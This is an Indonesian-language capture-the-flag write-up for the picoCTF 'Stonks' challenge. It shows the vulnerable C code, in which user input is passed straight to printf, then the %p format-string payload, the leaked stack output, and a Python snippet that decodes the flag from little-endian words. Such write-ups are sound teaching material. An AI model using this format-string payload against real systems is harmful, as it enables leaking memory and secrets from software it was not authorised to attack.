 nc mercury.picoctf.net 16439
 
 solve dengan cara format strings attack

```
int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");
```

```
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```

disini terlihat ```printf(user_buf);``` adalah format string merupakan data yang dapat di kontrol 

di awal terlihat buy_stonks(), saya melihat melihat apa yang tampak seperti file flag sedang dimuat dan isinya sedang disalin ke buffer di tumpukan:

```
char api_buf[FLAG_BUFFER];
FILE *f = fopen("api","r");
if (!f) {
    printf("Flag file not found. Contact an admin.\n");
    exit(1);
}
fgets(api_buf, FLAG_BUFFER, f);
```

jadi pada tumpukan itu, dapat diketahui bahwa printf() akan menarik data dari tumpukan secara berurutan untuk mencocokkan setiap penentu format dalam string format yang disediakan.
karna mengetahui ini adalah format strings attack saya menggunakan ```%p``` 

```
What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Buying stonks with token:
0x83454500x804b0000x80489c30xf7f8ed800xffffffff0x10x83431600xf7f9c1100xf7f8edc7(nil)0x83441800x10x83454300x83454500x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x626337630x656163360xffdf007d0xf7fc9af80xf7f9c4400xa01a7e000x1(nil)0xf7e2bce90xf7f9d0c00xf7f8e5c00xf7f8e0000xffdf15d80xf7e1c68d0xf7f8e5c00x8048eca0xffdf15e4(nil)0xf7fb0f090x804b0000xf7f8e0000xf7f8ee200xffdf16180xf7fb6d50
Portfolio as of Wed Jan 25 14:45:07 UTC 2023


1 shares of GBQJ
8 shares of OX
8 shares of O
18 shares of VY
9 shares of BI
9 shares of M
190 shares of FH
268 shares of B
4 shares of JTKA
283 shares of VXE
1006 shares of S
Goodbye!
```

lalu terliat banyak bilangan hex dan saya langsung convert ke ascii, setelah di decode saya melihat flag aneh yang ternyata integers little endian
setelah itu saya mendecode little endian menggunakan python

```
string = "ocip{FTC0l_I4_t5m_ll0m_y_y3n4cdbae52???????}"
out = ""
temp = ""
index = 0
for char in string:
    temp += char
    index += 1
    if index%4 == 0:
        fwd = ""
        for temp_char in temp:
            fwd = temp_char + fwd
        out += fwd
        temp = ""
print(out)
```

picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}???????



